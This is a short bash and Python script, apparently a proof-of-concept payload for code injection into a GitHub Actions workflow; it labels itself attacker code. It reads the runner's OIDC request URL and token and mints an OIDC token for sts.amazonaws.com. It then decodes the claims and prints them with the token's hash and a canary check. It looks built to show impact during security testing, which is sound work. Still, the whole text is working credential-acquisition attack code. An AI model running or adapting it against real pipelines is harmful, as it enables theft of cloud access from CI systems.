#!/usr/bin/env bash
set -euo pipefail
python3 - <<'PY'
import os, json, hashlib, base64, urllib.request, urllib.parse
v=os.environ.get("VM7_CODEINJ_CANARY","")
print("ATTACKER_AWS_OIDC_CODE=1")
print("CANARY_PRESENT="+("1" if v else "0"))
print("CANARY_SHA256="+(hashlib.sha256(v.encode()).hexdigest() if v else "missing"))
url=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")
tok=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
print("OIDC_ENV_PRESENT="+("1" if url and tok else "0"))
if url and tok:
    sep="&" if "?" in url else "?"
    req_url=url+sep+urllib.parse.urlencode({"audience":"sts.amazonaws.com"})
    req=urllib.request.Request(req_url,headers={"Authorization":"Bearer "+tok})
    with urllib.request.urlopen(req,timeout=10) as resp:
        data=json.load(resp)
    jwt=data.get("value","")
    parts=jwt.split(".")
    if len(parts)!=3:
        raise SystemExit("unexpected oidc token shape")
    payload=parts[1]+"="*((4-len(parts[1])%4)%4)
    claims=json.loads(base64.urlsafe_b64decode(payload.encode()).decode())
    print("OIDC_TOKEN_ACQUIRED=1")
    print("OIDC_TOKEN_SHA256="+hashlib.sha256(jwt.encode()).hexdigest())
    for key in ["iss","aud","repository","ref","sha","event_name","sub"]:
        val=claims.get(key,"")
        if isinstance(val,list): val=",".join(map(str,val))
        print("OIDC_"+key.upper()+"="+str(val))
else:
    print("OIDC_TOKEN_ACQUIRED=0")
PY
